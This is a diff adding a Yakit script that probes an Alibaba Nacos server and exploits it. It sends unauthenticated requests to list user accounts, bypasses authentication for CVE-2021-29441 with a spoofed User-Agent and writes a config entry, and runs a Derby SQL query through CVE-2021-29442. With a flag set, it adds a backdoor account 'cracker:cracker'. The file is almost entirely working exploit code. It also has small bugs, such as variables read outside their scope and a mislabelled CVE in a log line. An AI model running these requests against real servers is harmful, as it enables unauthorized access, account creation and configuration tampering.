@@ -1,0 +1,258 @@
+yakit.AutoInitYakit()
+log.setLevel("info")
+
+targetUrl = cli.String("targetUrl",cli.setDefault("http://192.168.101.146:8084"))
+if targetUrl == "" {
+    die("no target")
+}
+add_user = cli.Bool("add_user")
+// add_user =true
+
+#--------------------------WORKSPACE-----------------------------
+vulpath=["/v1/auth/users?pageNo=1&pageSize=9","/nacos/v1/auth/users?pageNo=1&pageSize=9"]
+user_agent=["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0 Waterfox/91.3.2","Nacos-Server"]
+
+// Alibaba Nacos未授权访问
+Nacos_unauthenticated = func(target,path){
+    rsp, req, err = poc.HTTP(`GET {{params(path)}} HTTP/1.1
+Host: {{params(target)}}
+User-Agent:Nacos-Server
+Accept: application/json, text/plain, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Connection: close`,poc.params({"path":path,"target":target}),
+    )
+
+// printf("%s",string(req))
+if err != nil {
+    yakit.Error("Nacos_unauthenticated数据包发送失败")
+    log.error("Nacos_unauthenticated数据包发送失败")
+    // die(err)
+    return false
+}
+header, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+if str.MatchAllOfSubString(header, "HTTP/1.1 200") && str.MatchAllOfSubString(header, "Content-Type: application/json") &&len(string(body)) > 0{
+    r,err = re.Compile(`username.*?password.*?}`)
+    res = r.FindAllStringSubmatch(string(body),-1)
+    if len(res) != 0 {  
+        return true
+    }
+ } else{
+    return false
+  }
+}
+
+// Alibaba Nacos未授权添加用户
+Nacos_unauthenticated_adduser =func(target){
+    rsp,req,err = poc.HTTP(`POST /nacos/v1/auth/users HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Nacos-Server
+Accept: application/json, text/plain, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+username=cracker&password=cracker`,poc.params({"target":target,}),)
+if err != nil {
+    yakit.Error("Nacos_unauthenticated_adduser数据包发送失败")
+    log.error("Nacos_unauthenticated_adduser数据包发送失败")
+    // die(err)
+    return false
+    }
+header, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+if str.MatchAllOfSubString(header, "HTTP/1.1 200") && str.MatchAllOfSubString(header, "Content-Type: application/json") &&len(string(body)) > 0{
+    r,err = re.Compile(`"code":200,"message":"create user ok!","data":null`)
+    res = r.FindAllStringSubmatch(string(body),-1)
+    if len(res) != 0 {  
+        yakit.Info("目标 %v 通过Alibaba Nacos未授权添加用户craker:cracker",targetUrl)
+        log.info("目标 %v 通过Alibaba Nacos未授权添加用户craker:cracker",targetUrl)
+        detail := {
+                "name": "Alibaba Nacos未授权添加用户cracker:cracker",
+                "Info": res,
+                // "request": codec.EncodeBase64(req),
+                // "response": codec.EncodeBase64(rsq),
+            }
+        risk.NewRisk(
+                targetUrl,
+                risk.severity("high"),
+                risk.title(sprintf("Alibaba Nacos未授权添加用户craker:cracker: %v", targetUrl)),
+                risk.titleVerbose(sprintf("Alibaba Nacos未授权添加用户craker:cracker：%v", targetUrl)),
+                risk.type("未授权访问"),
+                risk.payload(codec.EncodeBase64(req)),
+                risk.details(detail),
+            )
+        yakit.Info("%v",res)
+        log.info("%v",res)
+        // yakit_output(detail)
+        return true
+    }
+ } else{
+    yakit.Info("无法 通过未授权添加用户")
+    log.info("无法 通过未授权添加用户")
+    return false
+  }
+
+}
+
+//Alibaba Nacos认证绕过（CVE-2021-29441）
+// https://github.com/advisories/GHSA-36hp-jr8h-556f
+Nacos_CVE2021_29441= func(target,agent){
+    rsp,req,err = poc.HTTP(`POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld HTTP/1.1
+Host: {{params(target)}}
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Connection: close
+User-Agent: {{params(agent)}}`,poc.params({"target":target,"agent":agent}),)
+
+if err != nil {
+    yakit.Error("Nacos_CVE2021_29441数据包发送失败")
+    log.error("Nacos_CVE2021_29441数据包发送失败")
+    // die(err)
+    return false
+    }
+header, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+if str.MatchAllOfSubString(header, "HTTP/1.1 200") && str.MatchAllOfSubString(header, "Content-Type: application/json") &&len(string(body)) > 0{
+    r,err = re.Compile(`true`)
+    res = r.FindAllStringSubmatch(string(body),-1)
+    if len(res) != 0 {  
+        return true
+    }
+ } else{
+    return false
+  }
+}
+// Alibaba Nacos认证绕过(CVE-2021-29442) 
+// https://github.com/advisories/GHSA-xv5h-v7jh-p2qh
+Nacos_CVE2021_29442= func(target){
+    rsp,req,err = poc.HTTP(`GET /nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st HTTP/1.1
+Host: {{params(target)}}
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Connection: close
+User-Agent: Nacos-Server`,poc.params({"target":target,}),)
+
+if err != nil {
+    yakit.Error("Nacos_CVE2021_29442数据包发送失败")
+    log.error("Nacos_CVE2021_29443数据包发送失败")
+    // die(err)
+    return false
+    }
+header, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+if str.MatchAllOfSubString(header, "HTTP/1.1 200") && str.MatchAllOfSubString(header, "Content-Type: application/json") &&len(string(body)) > 0{
+    r,err = re.Compile(`\"TABLENAME\":\"(?:(?:(?:(?:(?:APP_CONFIGDATA_RELATION_[PS]UB|SYS(?:(?:CONGLOMERAT|ALIAS|(?:FI|RO)L)E|(?:(?:ROUTINE)?|COL)PERM|(?:FOREIGN)?KEY|CONSTRAINT|T(?:ABLEPERM|RIGGER)|S(?:TAT(?:EMENT|ISTIC)|EQUENCE|CHEMA)|DEPEND|CHECK|VIEW|USER)|USER|ROLE)S|CONFIG_(?:TAGS_RELATION|INFO_(?:AGGR|BETA|TAG))|TENANT_CAPACITY|GROUP_CAPACITY|PERMISSIONS|SYSCOLUMNS|SYS(?:DUMMY1|TABLES)|APP_LIST)|CONFIG_INFO)|TENANT_INFO)|HIS_CONFIG_INFO)\"`)
+    res = r.FindAllStringSubmatch(string(body),-1)
+    if len(res) != 0 {  
+        yakit.Info("目标 %v 存在Alibaba Nacos认证绕过(CVE-2021-29442)",targetUrl)
+        log.info("目标 %v 存在Alibaba Nacos认证绕过(CVE-2021-29442)",targetUrl)
+        detail := {
+                "name": "Alibaba Nacos认证绕过(CVE-2021-29442)",
+                "Info": res,
+                // "request": codec.EncodeBase64(req),
+                // "response": codec.EncodeBase64(rsq),
+            }
+        risk.NewRisk(
+                targetUrl,
+                risk.severity("high"),
+                risk.title(sprintf("Alibaba Nacos认证绕过(CVE-2021-29442): %v", targetUrl)),
+                risk.titleVerbose(sprintf("Alibaba Nacos认证绕过(CVE-2021-29442)：%v", targetUrl)),
+                risk.type("身份认证缺陷"),
+                risk.payload(codec.EncodeBase64(req)),
+                risk.details(detail),
+            )
+        yakit.Info("%v",res)
+        log.info("%v",res)
+        
+        // yakit_output(detail)
+        return true
+    }
+ } else{
+    yakit.Info("Alibaba Nacos认证绕过(CVE-2021-29442) 不存在")
+    log.info("Alibaba Nacos认证绕过(CVE-2021-29442) 不存在")
+    return false
+  }
+}
+
+
+
+host,port,err = str.ParseStringToHostPort(targetUrl)
+target = sprintf("%v:%v", host, port)
+yakit.Info("开始测试目标：%v", targetUrl)
+log.info("开始测试目标：%v", targetUrl)
+yakit.SetProgress(0.1)
+for _,path = range vulpath{
+    // println(target,path)
+    // 标记
+    flag = Nacos_unauthenticated(target,path)
+    if flag{
+        yakit.Info("目标 %v 存在Alibaba Nacos未授权访问",targetUrl)
+        log.info("目标 %v 存在Alibaba Nacos未授权访问",targetUrl)
+        detail := {
+                "name": "Alibaba Nacos未授权访问",
+                "Info": res,
+                // "request": codec.EncodeBase64(req),
+                // "response": codec.EncodeBase64(rsq),
+            }
+        risk.NewRisk(
+                targetUrl,
+                risk.severity("high"),
+                risk.title(sprintf("Alibaba Nacos未授权访问: %v", targetUrl)),
+                risk.titleVerbose(sprintf("Alibaba Nacos未授权访问：%v", targetUrl)),
+                risk.type("未授权访问"),
+                risk.payload(codec.EncodeBase64(req)),
+                risk.details(detail),
+            )
+        yakit.Info("%v",res)
+        log.info("%v",res)
+        // yakit_output(detail)
+        // 开始测试未授权添加用户
+        if add_user{
+            Nacos_unauthenticated_adduser(target)
+        }
+        break
+    }
+}
+if !flag{
+    yakit.Info("Alibaba Nacos未授权访问 不存在")
+    log.info("Alibaba Nacos未授权访问 不存在")
+}
+yakit.SetProgress(0.3)
+for _,agent = range user_agent{
+    // println(target,path)
+    // 标记
+    flag = Nacos_CVE2021_29441(target,agent)
+    if flag{
+        yakit.Info("目标 %v 存在Alibaba Nacos认证绕过(CVE-2021-29441)",targetUrl)
+        log.info("目标 %v 存在Alibaba Nacos认证绕过(CVE-2021-29441)",targetUrl)
+        detail := {
+                "name": "Alibaba Nacos认证绕过(CVE-2021-29441)",
+                "Info": res,
+                // "request": codec.EncodeBase64(req),
+                // "response": codec.EncodeBase64(rsq),
+            }
+        risk.NewRisk(
+                targetUrl,
+                risk.severity("high"),
+                risk.title(sprintf("Alibaba Nacos认证绕过(CVE-2021-29441): %v", targetUrl)),
+                risk.titleVerbose(sprintf("Alibaba Nacos认证绕过(CVE-2021-29441)：%v", targetUrl)),
+                risk.type("身份认证绕过"),
+                risk.payload(codec.EncodeBase64(req)),
+                risk.details(detail),
+            )
+        yakit.Info("%v",res)
+        log.info("%v",res)
+        // yakit_output(detail)
+        break
+    }
+}
+if !flag{
+    yakit.Info("Alibaba Nacos认证绕过(CVE-2021-29441) 不存在")
+    log.info("Alibaba Nacos认证绕过(CVE-2021-29441) 不存在")
+}
+
+yakit.SetProgress(0.7)
+Nacos_CVE2021_29442(target)
+
+yakit.SetProgress(1)
+yakit.Info("检测完成")
+log.info("检测完成")
